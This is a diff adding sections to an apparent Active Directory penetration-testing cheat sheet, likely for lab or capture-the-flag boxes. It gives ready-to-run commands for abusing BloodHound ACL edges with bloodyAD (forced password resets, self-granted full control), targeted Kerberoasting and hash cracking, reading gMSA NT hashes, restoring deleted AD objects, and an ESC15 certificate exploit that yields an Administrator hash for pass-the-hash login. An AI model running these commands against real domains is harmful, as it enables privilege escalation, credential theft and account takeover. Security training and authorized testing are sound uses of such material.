@@ -178,6 +178,66 @@ evil-winrm -i $IP -u user -H <NTLM_hash>      # pass-the-hash (no password neede
 
 ---
 
+## BloodHound ACL-edge → abuse (bloodyAD)
+
+You own a principal and BloodHound shows an outbound edge. Each edge has one matching move.
+bloodyAD shape: `bloodyAD -d $DOMAIN -u <you> -p <pw|:NThash> -H $IP <action> <args>`
+(`-p ':<hash>'` = pass-the-hash; single-quote `DOMAIN\user` and anything with `$`/`!`).
+
+| BloodHound edge | What it lets you do | bloodyAD |
+|---|---|---|
+| **WriteSPN** | make target Kerberoastable | `set object <target> servicePrincipalName -v 'cifs/x.$DOMAIN'` |
+| **AddSelf / AddMember** | join a group → inherit its rights | `add groupMember <GROUP> <you>` |
+| **ForceChangePassword** | reset target's pw (no old pw) | `set password <target> 'NewPass123!'` |
+| **GenericAll / GenericWrite** | full control → reset pw, write attrs | `set password <target> 'NewPass123!'` |
+| **WriteOwner** | 3-step: own → grant → act (below) | see WriteOwner dance |
+| **Owns / WriteDacl** | write yourself an ACE | `add genericAll <target> <you>` |
+
+```bash
+# WriteOwner dance (owning ≠ modifying — you get the implicit right to rewrite the DACL):
+bloodyAD ... set owner <target> <you>          # 1. become owner  -> "Old owner ... is now replaced"
+bloodyAD ... add genericAll <target> <you>     # 2. grant yourself full control
+bloodyAD ... set password <target> 'NewPass123!'   # 3. now act      -> "Password changed successfully!"
+
+# --bak on 'set object' prints the restore command — tidy up writes afterwards.
+```
+
+## Targeted Kerberoast (WriteSPN)
+
+```bash
+bloodyAD ... set object <user> servicePrincipalName -v 'cifs/fake.$DOMAIN'   # write a bogus SPN
+impacket-GetUserSPNs -request-user <user> -dc-ip $IP -outputfile h.krb5tgs "$DOMAIN/you:pw"
+#   -outputfile avoids shell $-expansion mangling the $krb5tgs$ string (never echo it in "double quotes")
+john h.krb5tgs --wordlist=<wordlists>/rockyou.txt         # (or hashcat -m 13100)
+bloodyAD ... set object <user> servicePrincipalName -v    # -v with no value = delete the SPN (cleanup)
+```
+Note: `GetUserSPNs` only roasts accounts that already have an SPN — "No entries found!" means write one first.
+
+## gMSA password read (ReadGMSAPassword edge)
+
+```bash
+nxc ldap $DOMAIN -u <you> -p <pw> --gmsa      # prints NTLM: <hash> for the gMSA$ account — usable directly (no cracking)
+```
+A gMSA's pw is AD-managed in `msDS-ManagedPassword`; reading it = you get the NT hash.
+
+## AD Recycle Bin (deleted / tombstoned objects)
+
+Empty OU you control + a box that hints at "deleted/tomb" → look in the Recycle Bin. Deleted objects are
+hidden without the Show-Deleted control, and you must search the `CN=Deleted Objects` container directly:
+```bash
+bloodyAD ... get search --base 'CN=Deleted Objects,DC=<d>,DC=<tld>' --filter '(objectClass=*)' \
+  --attr distinguishedName,sAMAccountName,lastKnownParent -c 1.2.840.113556.1.4.2065
+#   (a plain (isDeleted=TRUE) subtree search returns nothing without -c 1.2.840.113556.1.4.2065)
+```
+`lastKnownParent` tells you which OU it belonged to. Restore from a WinRM shell (AD module) — it goes back
+to that parent; if several decoys share a name, only one is right, so restore → inspect → delete → retry:
+```powershell
+Restore-ADObject -Identity <objectGUID>        # GUID = the bit after CN=name\0ADEL:
+Remove-ADObject  -Identity <objectGUID>        # undo a wrong guess (name must be unique)
+```
+
+---
+
 ## Kerberos clock skew
 
 Symptom: `KRB_AP_ERR_SKEW` / clock errors from certipy/impacket.
@@ -204,6 +264,17 @@ certipy req -ca <CA> -retrieve <id> -u user@$DOMAIN -p pass -dc-ip $IP         #
 certipy auth -pfx administrator.pfx -dc-ip $IP                                  # 5. PKINIT -> NT hash
 # then pass-the-hash: evil-winrm -i $IP -u Administrator -H <hash>
 ```
+
+### ESC15 — CVE-2024-49019 (v1 template, "enrollee supplies subject")
+Schema-v1 template that doesn't pin app policies → inject a Client Authentication policy + set identity to Administrator.
+```bash
+faketime -f '+4h' certipy req -u user@$DOMAIN -p pass -dc-ip $IP -target dc01.$DOMAIN \
+  -ca <CA> -template <v1Template> -upn administrator@$DOMAIN -application-policies 'Client Authentication'
+#   -> administrator.pfx   (use faketime to beat clock skew on the auth step)
+faketime -f '+4h' certipy auth -pfx administrator.pfx -dc-ip $IP        # PKINIT -> Administrator NT hash
+evil-winrm -i $DOMAIN -u administrator -H <hash>
+```
+(`certipy find ... -vulnerable -stdout` flags `ESC15 : Enrollee supplies subject and schema version is 1.`)
 
 ---
 
